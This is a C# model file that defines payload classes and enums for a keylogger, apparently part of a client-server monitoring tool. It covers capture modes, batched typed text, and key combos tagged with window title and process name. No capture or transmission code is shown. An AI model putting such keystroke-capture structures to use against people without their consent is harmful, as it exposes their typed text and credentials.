using System;
using System.Collections.Generic;

namespace Common.Models
{
    public enum KeyLoggerMode
    {
        Parallel = 0,
        Continuous = 1
    }

    public enum KeyComboCategory
    {
        Chung = 0,
        DieuHuong = 1,
        SoanThao = 2,
        TrinhDuyet = 3,
        HeThong = 4,
        TuyChinh = 5,
        DacBiet = 6
    }

    public sealed class KeyLoggerStartPayload
    {
        public KeyLoggerMode Mode { get; set; } = KeyLoggerMode.Parallel;
        public int MaxChars { get; set; } = 50; // continuous
        public int MaxIntervalMs { get; set; } = 15000; // continuous
    }

    public sealed class KeyLoggerEventPayload
    {
        public string Key { get; set; } = string.Empty;
        public DateTime TimestampUtc { get; set; } = DateTime.UtcNow;
    }

    public sealed class KeyLoggerBatchPayload
    {
        public string Text { get; set; } = string.Empty;
        public DateTime TimestampUtc { get; set; } = DateTime.UtcNow;
        public string WindowTitle { get; set; } = string.Empty;
        public string ProcessName { get; set; } = string.Empty;
        public int? SequenceId { get; set; }
        public string DateKey { get; set; } = string.Empty;
    }

    public sealed class KeyLoggerComboPayload
    {
        public string Combo { get; set; } = string.Empty; // e.g., "Ctrl + C"
        public KeyComboCategory Category { get; set; } = KeyComboCategory.Chung;
        public DateTime TimestampUtc { get; set; } = DateTime.UtcNow;
        public string WindowTitle { get; set; } = string.Empty;
        public string ProcessName { get; set; } = string.Empty;
    }

    public sealed class KeyLoggerComboBatchPayload
    {
        public List<KeyLoggerComboPayload> Combos { get; set; } = new List<KeyLoggerComboPayload>();
        public DateTime BatchTimestampUtc { get; set; } = DateTime.UtcNow;
    }
}


